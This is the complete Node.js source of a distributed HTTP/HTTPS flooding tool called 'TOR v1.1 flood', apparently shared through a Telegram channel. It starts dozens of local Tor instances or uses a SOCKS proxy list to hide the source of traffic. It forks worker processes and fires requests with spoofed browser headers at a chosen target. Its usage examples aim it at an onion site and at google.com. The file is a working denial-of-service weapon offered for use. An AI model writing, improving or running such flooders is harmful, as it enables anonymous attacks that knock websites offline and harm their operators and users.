/*
    TOR v1.1 flood

    Released by ATLAS API corporation (atlasapi.co)

    t.me/atlasapi for more scripts

    Made by Benshii Varga

    npm install colors socks
*/

const net = require('net');
const tls = require('tls');
const fs = require('fs');
const os = require('os');
const cluster = require('cluster');
const socks = require('socks').SocksClient;
const { spawn } = require('child_process');
const colors = require('colors');

function help() {
    console.clear()
    console.log(`
    ${colors.bold('telegram')}:                 ${colors.cyan('t.me/benshii')}
    ${colors.bold('product')}:                    ${colors.magenta('TOR v1.0')}
    ${colors.bold('date')}:                     ${colors.bgWhite.black.italic('28 Aug, 2024')}`);

    console.log(`
    ${colors.bold.underline("usage")}:
        node tor.js (target) (time) (rate) (threads) (proxyfile) (options)
        
    ${colors.bold.underline('options')}:
        --debug    ${colors.green('true')}/${colors.red('false')}   ~   ${colors.italic('Enable script debugging.')}     [default: ${colors.green('true')}]
        --local    ${colors.green('true')}/${colors.red('false')}   ~   ${colors.italic('Use local tor listener.')}      [default: ${colors.green('true')}]
        --close    ${colors.green('true')}/${colors.red('false')}   ~   ${colors.italic('Close connection header.')}     [default: ${colors.red('false')}]
        --bogus    ${colors.green('true')}/${colors.red('false')}   ~   ${colors.italic('Base64 encode headers.')}       [default: ${colors.red('false')}]

        --method    ${colors.cyan('GET')}/${colors.cyan('POST')}    ~   ${colors.italic('HTTP request method.')}         [default: ${colors.cyan('GET')}]
        --data       ${colors.cyan('q=1234')}     ~   ${colors.italic('HTTP POST body data.')}         [default: ${colors.cyan('null')}]

        --timeout     ${colors.yellow('60000')}     ~   ${colors.italic('Socks proxy timeout (ms).')}    [default: ${colors.yellow('60000')}]
        --count        ${colors.yellow('100')}      ~   ${colors.italic('Number of Tor processes.')}     [default: ${colors.yellow('50')}]
        --range     ${colors.yellow('9000')}-${colors.yellow('9500')}   ~   ${colors.italic('Tor listener port range.')}     [default: ${colors.yellow('9000')}-${colors.yellow('9500')}]
        --type         ${colors.yellow('4')}/${colors.yellow('5')}      ~   ${colors.italic('Set SOCKS proxy type.')}        [default: ${colors.yellow('5')}]
        --tls         ${colors.yellow('1')}/${colors.yellow('2')}/${colors.yellow('3')}     ~   ${colors.italic('Set custom TLS version.')}      [default: ${colors.yellow('2')}]
    `);
}

function examples() {
    console.log("examples:")
    console.log("   node tor.js https://target.onion/ 60 32 4 socks5.txt --range=9000-9500 --local=true");
    console.log("   node tor.js https://www.google.com/ 60 32 4 socks5.txt --close=true --type=5");
    console.log("")
    process.exit(0);
}

const tor_processes = [];
const tor_caches = [];

const temp_directory = '/var/tmp';

async function exit() {
    // Kill Tor processes
    for (const pid of tor_processes) {
        try {
            console.log("Killing TOR process:", pid);
            process.kill(pid, 'SIGTERM');
        } catch (error) {
            console.error(`Failed to kill process ${pid}:`, error);
        }
    }

    try {
        const files = await fs.promises.readdir(temp_directory);
        for (const file of files) {
            if (file.startsWith('.')) {
                console.log("Removing entry:", file);
                await fs.promises.rm(`${temp_directory}/${file}`, { recursive: true, force: true });
            }
        }
    } catch (err) {
        console.log("Error in reading or removing files from temp directory:", err);
    }

    process.exit(0);
}



process.on('SIGINT', exit);
process.on('SIGTERM', exit);
process.on('SIGQUIT', exit);
process.on('exit', exit);

process.on('uncaughtException', function (err) {
    // console.log('uncaughtException', err);
}).on('unhandledRejection', function (err) {
    // console.log('unhandledRejection:', err);
}).on('warning', function (warning) {
    console.log('warning:', warning);
}).on("SIGINT", () => {
    console.log("exiting...");
    exit()
})

function error(buf) {
    console.log(`[error]: ${buf}`);
    help();
    examples();
}

if (process.argv.length < 7) {
    help();
    process.exit(0);
}

function get_option(flag) {
    const index = process.argv.indexOf(flag);
    return index !== -1 && index + 1 < process.argv.length ? process.argv[index + 1] : undefined;
}

const options = [
    { flag: '--debug', value: get_option('--debug'), default: true },
    { flag: '--local', value: get_option('--local'), default: true },
    { flag: '--close', value: get_option('--close') , default: false },
    { flag: '--bogus', value: get_option('--bogus'), default: false },

    { flag: '--method', value: get_option('--method'), default: "GET" },
    { flag: '--data', value: get_option('--data'), default: undefined },

    { flag: '--timeout', value: get_option('--timeout'), default: 60000 },
    { flag: '--count', value: get_option('--count'), default: 50 },
    { flag: '--range', value: get_option('--range'), default: [9000, 9500] },

    { flag: '--type', value: get_option('--type'), default: 5 },
    { flag: '--tls', value: get_option('--tls'), default: 'TLSv1.2' },
];

function enabled(buf) {
    var flag = `--${buf}`;
    const option = options.find(option => option.flag === flag);

    if (option === undefined) { return false; }

    const optionValue = option.value;

    if (optionValue === "true" || optionValue === true) {
        return true;
    } else if (optionValue === "false" || optionValue === false) {
        return false;
    }

    if (Array.isArray(optionValue)) {
        return optionValue;
    }
    
    if (!isNaN(optionValue)) {
        return parseInt(optionValue);
    }

    if (typeof optionValue === 'string') {
        return optionValue;
    }

    if (option.default) {
        return option.default;
    }

    return false;
}

const target = process.argv[2];
const time = parseInt(process.argv[3]);
const ratelimit = parseInt(process.argv[4]);
const threads = parseInt(process.argv[5]);
const proxyfile = process.argv[6];

// const { target, time, ratelimit, threads, proxyfile, options } = parseArguments();

const statuses = {};
const used_ports = [];

var url = new URL(target);

const proxies = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n');
let local_proxies = [];

const protocol = url.protocol.replace(":", "");
const port = url.port || (url.protocol === 'https:' ? 443 : 80);

// console.log(`target: [${url.href}]\nprotocol: [${protocol}]\nport: [${port}]`)

function log(buf, err) {
    if (enabled('debug')) {
        let d = new Date();
        let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
        let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
        let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();

        if (isNaN(hours) || isNaN(minutes) || isNaN(seconds)) {
            hours = "undefined";
            minutes = "undefined";
            seconds = "undefined";
        }

        if (err) {
            console.log(`(${colors.cyan(hours)}:${colors.cyan(minutes)}:${colors.cyan(seconds)}) | [${colors.magenta('js/tor')}] (${colors.red.bold('error')}) | ${buf}`);
            return
        }

        console.log(`[${colors.magenta.bold('js/tor')}] | ${buf}`);
    }
}

class Socket {
    constructor(host, port) {
      this.host = host;
      this.port = parseInt(port);
      this.type = enabled('type');
    }
  
    connect(host, port) {
        // console.log(`host: ${host}, port: ${port}, timeout: ${options.timeout}`);
      return new Promise((resolve, reject) => {
        socks.createConnection({
          proxy: {
            host: this.host,
            port: this.port,
            type: this.type
          },
          command: 'connect',
          destination: {
            host: host,
            port: port
          },
          timeout: enabled('timeout')
        }, (error, info) => {
          if (error) {
            return reject(new Error(`SOCKS5 connection error: ${error}`));
          }
          resolve(info.socket);
        });
      });
    }
}

function close(stream) {
    if (!stream || stream.destroyed) return go();
    stream.end(() => {
        if (!stream.destroyed) {
            stream.destroy();
        }
        stream.removeAllListeners();
    });

    const socket = stream._parent;
    if (socket && !socket.destroyed) {
        socket.end(() => {
            if (!socket.destroyed) {
                socket.destroy();
            }
        });
        socket.removeAllListeners();
    }
    return go();
}

function random_string(minLength, maxLength) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';

    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }

    return result;
}

function encode_base64(string) {
    const encoded = Buffer.from(string).toString('base64');
    return encoded;
}

function http1_headers() {

    const end = "\r\n";
    let headers = "";

    const randomVersion = Math.floor(Math.random() * 3) + 124;

    var method = enabled('method');
    if (!['GET', 'POST', 'PUT', 'PATCH', 'OPTIONS', 'DELETE'].includes(method)) {
        method = 'GET';
    }

    var data = enabled('data');

    var connection = enabled('close');
    if (connection && typeof connection === 'boolean' && connection === true) {
        connection = 'Close';
    } else {
        connection = 'Keep-Alive';
    }

    headers += `${method} ${url.pathname} HTTP/1.1${end}`;
    headers += `Host: ${url.hostname}:${port}${end}`;
    headers += `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7${end}`;
    headers += `Accept-Encoding: gzip, deflate${end}`;
    headers += `Accept-Language: en-US,en;q=0.9${end}`;
    headers += `Upgrade-Insecure-Requests: 1${end}`;
    if (enabled('bogus')) {
        headers += `User-Agent: ${encode_base64(random_string(36, 42))}${end}`;
    } else {
        headers += `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${randomVersion}.0.0.0 Safari/537.36${end}`;
    }
    headers += `Cache-Control: max-age=0${end}`;
    headers += `Connection: ${connection}${end}`;

    if (method === 'POST' && data !== undefined) {
        const contentLength = Buffer.byteLength(data, 'utf8');
        headers += `Content-Length: ${contentLength}${end}`;
        headers += end;
        headers += data;
    } else {
        headers += end;
    }

    return headers;
}

async function go() {
    let proxyHost, proxyPort;
    if (enabled('local')) {
        do {
            if (local_proxies.length > 0) {
                const random_proxy = local_proxies[~~Math.floor(Math.random() * local_proxies.length)];
                [proxyHost, proxyPort] = random_proxy.address.split(':');
                break;
            }
            await new Promise(resolve => setTimeout(resolve, 1000));
        } while (local_proxies.length === 0);
    } else {
        [proxyHost, proxyPort] = proxies[~~Math.floor(Math.random() * proxies.length)].split(':');
    }

    if (proxyHost === undefined || proxyPort === undefined) {
        await new Promise(resolve => setTimeout(resolve, 1000));
        return go();
    }
    const client = new Socket(proxyHost, proxyPort);

    if (protocol === 'http') {
        setInterval(async () => {
            client.connect(url.hostname, port).then(async (socket) => {
                if (socket) {
                    // console.log("socket connected");
                }
                // socket.send(random_string(10, 100).repeat(5000));
            }, 1000 / ratelimit).catch(() => {})
        })
    } else if (protocol === 'https') {
        await client.connect(url.hostname, port).then(async (socket) => {
            // console.log('socket connected')
            const tlsOptions = {
                host: url.hostname,
                port: url.port,
                socket: socket,
                servername: url.hostname,
                minVersion: enabled('tls'),
                rejectUnauthorized: false,
                // ALPNProtocols: ['h2', 'http/1.1'],
            };
            const tlsStream = tls.connect(tlsOptions, () => {
                // console.log("TLS connected");
            const socket = tlsStream._parent;
            socket.once('close', () => {
                close(tlsStream);
            })
    
            tlsStream.on('data', (data) => {
                const responseStr = data.toString('utf8');
                const statusMatch = responseStr.match(/HTTP\/1\.1 (\d{3})/);
                if (statusMatch) {
                    const statusCode = parseInt(statusMatch[1]);
            
                    if (!statuses[statusCode]) {
                        statuses[statusCode] = 0;
                    }
                    statuses[statusCode]++;
                }
            });
              
            tlsStream.on('end', () => {
                close(tlsStream);
            });
              
            tlsStream.on('error', (err) => {
                close(tlsStream);
            });
    
            function request() {
                if (!tlsStream || tlsStream.destroyed) return;
                    const buffer = http1_headers()
                    tlsStream.write(buffer, (err) => {
                        if (err) {close(tlsStream)} else {
                            setTimeout(() => {
                                request();
                            }, 1000 / ratelimit);
                        }
                    });
                }
                request()
            })
        }).catch((err) => {
            proxy_error(proxyHost, proxyPort);
            return go();
        })
    }
}

function proxy_error(proxyHost, proxyPort) {
    const proxyIndex = local_proxies.findIndex(p => p.address === `${proxyHost}:${proxyPort}`);
    if (proxyIndex !== -1) {
        local_proxies[proxyIndex].errors += 1;

        if (local_proxies[proxyIndex].errors >= 10) {
            local_proxies.splice(proxyIndex, 1);
            tor();
        }
    }
}

function check_port(port, host = '127.0.0.1') {
    return new Promise((resolve) => {
        const server = net.createServer();

        server.listen(port, host, () => {
            server.close(() => resolve(true));
        });

        server.on('error', () => {
            resolve(false);
        });
    });
}

function random_port(min, max) {
    let number;
    do {
        number = Math.floor(Math.random() * (max - min + 1) + min);
    } while (used_ports.includes(number));
    return number;
}


function get_current_timestamp() {
    return Math.floor(Date.now() / 1000);
}

async function start_tor_instance(port) {
    // console.log("starting tor instance")
    const randomString = [...Array(4)].map(() => Math.random().toString(36).charAt(2)).join('');
    const tor_cache = `${temp_directory}/.tor${port}_${randomString}`

    const torProcess = spawn(
        'tor', [
            '-SocksPort', port,
            '-DataDirectory', tor_cache,
            // '-NumCPUs', '1'
        ],
    {
        // detached: false,
        detached: true,
        stdio: 'ignore',
        // stdio: ['pipe', 'pipe', 'pipe'] 
    });

    log(`Tor process started on port ${colors.bold(port)}`, false);
    tor_caches.push(tor_cache);
    tor_processes.push(torProcess.pid)
    local_proxies.push({
        address: `127.0.0.1:${port}`,
        date: get_current_timestamp(),
        errors: 0
    });
    torProcess.unref();

    torProcess.on('error', (err) => {
        // console.log("error:", err);
        log(`Failed to start tor on port ${colors.bold(port)}`, true);
        // remove_instance(tor_instances, torProcess);
    });

    torProcess.on('close', (code) => {
    log(`Tor process on port ${colors.bold(port)} exited`, false);
    const index = tor_processes.indexOf(torProcess.pid);
    if (index > -1) {
        tor_processes.splice(index, 1); // Remove the process from the array
    }
});

}

async function tor() {
    // console.log("calling tor");
    var range = enabled('range');
    // console.log(`range: ${range}`);
    let [min, max] = range;
    const port = random_port(min, max)
    const isAvailable = await check_port(port);
    if (!isAvailable) {
        // console.log(`port: ${port} is not available`);
        return tor();
    }
    used_ports.push(port);
    // console.log("calling start_tor_instance", port);
    await start_tor_instance(port);
}

if (cluster.isMaster) {

    const statuses = {};
    const workers = {};

    var count = enabled('count');
    if (typeof count !== 'number') {
        count = 10;
    }

    Array.from({ length: threads }, (_, i) => {
        const worker = cluster.fork({ core: i % os.cpus().length });
        cluster.workers[worker.id] = worker;
    });

    for (var i = 0; i < count; i++) {
        tor();
    }

    cluster.on('exit', (worker) => {
        console.log(`Worker ${worker.id} exited.`);
        const newWorker = cluster.fork({ core: worker.id % os.cpus().length });
        workers[newWorker.id] = newWorker;
    });

    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message]
        if (Array.isArray(message)) {
            for (let status of message) {
                for (let code in status) {
                    if (!statuses[code]) {
                        statuses[code] = 0;
                    }
                    statuses[code] += status[code];
                }
            }
        }
    });

    setInterval(() => {
        for (const id in cluster.workers) {
            const worker = cluster.workers[id];
            if (worker && worker.isConnected()) {
                worker.send({ localProxies: local_proxies });
            }
        }
    }, 500);

    if (enabled('debug')) {
        setInterval(async () => {
            const totalRAM = os.totalmem();
            const usedRAM = totalRAM - os.freemem();
            const ramPercentage = (usedRAM / totalRAM) * 100;
            let proxy_length;
            if (enabled('local')) {
                proxy_length = local_proxies.length;
            } else {
                proxy_length = proxies.length;
            }

            let d = new Date();
            let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
            let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
            let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();

            if (isNaN(hours) || isNaN(minutes) || isNaN(seconds)) {
                hours = "undefined";
                minutes = "undefined";
                seconds = "undefined";
            }

            console.log(`[${colors.magenta.bold('js/tor')}] | (${`${hours}:${minutes}:${seconds}`.cyan.underline}) | ${colors.bold('RAM')}: ${ramPercentage.toFixed(1)}%, ${colors.bold('Proxies')}: ${proxy_length}, ${colors.bold('Responses')}:`, statuses);
        }, 1000);
    }

    setTimeout(() => {
        // process.exit(1), time * 1000
        exit()
    }, time * 1000);

} else {
    // console.log("not a main thread");
    // setTimeout(() => {}, 1000);
    setTimeout(() => {
        setInterval(() => {
            go()
        }, 1);
    }, 3000);

    setInterval(() => {
        process.send([statuses]);

        for (let code in statuses) {
            statuses[code] = 0;
        }
    }, 1000);

    process.on('message', (message) => {
        if (message.localProxies) {
            local_proxies = message.localProxies;
        }
    });

    // setTimeout(() => {
    //     exit()
    // }, time * 1000);
}